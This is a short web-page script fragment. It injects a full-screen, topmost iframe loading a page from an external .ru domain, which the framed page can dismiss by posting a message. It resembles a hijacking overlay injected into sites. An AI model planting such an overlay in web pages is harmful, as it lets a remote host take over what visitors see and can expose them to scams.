    <script type="text/javascript">
      $("body").append("<style> body { margin: 0; padding: 0; } #neuro {z-index: 2147483647; height: 100%; width: 100%; position: fixed; border: none;} #imagelightbox-close { cursor: pointer; z-index: 2147483647; width: 2.5em; height: 2.5em; text-align: left; background-color: #666; border-radius: 50%; position: fixed; top: 1.5em; right: 1.5em;  -webkit-transition: color .3s ease; transition: color .3s ease; } #imagelightbox-close:hover, #imagelightbox-close:focus { background-color: #111; } #imagelightbox-close:before, #imagelightbox-close:after { width: 2px; background-color: #fff; content: ''; position: absolute; top: 20%; bottom: 20%; left: 50%; margin-left: -1px; } #imagelightbox-close:before { -webkit-transform: rotate( 45deg ); -ms-transform: rotate( 45deg ); transform: rotate( 45deg ); } #imagelightbox-close:after { -webkit-transform: rotate( -45deg ); -ms-transform: rotate( -45deg ); transform: rotate( -45deg ); }</style><iframe src='http://intouchwifi.ru/neurodoz/index.html' id='neuro'></iframe>");
      function receiveMessage(event){
        if (event.data=="removetheiframe"){
          var element = document.getElementById('neuro');
          element.parentNode.removeChild(element);
        }
      }
window.addEventListener("message", receiveMessage, false);
                    </script>
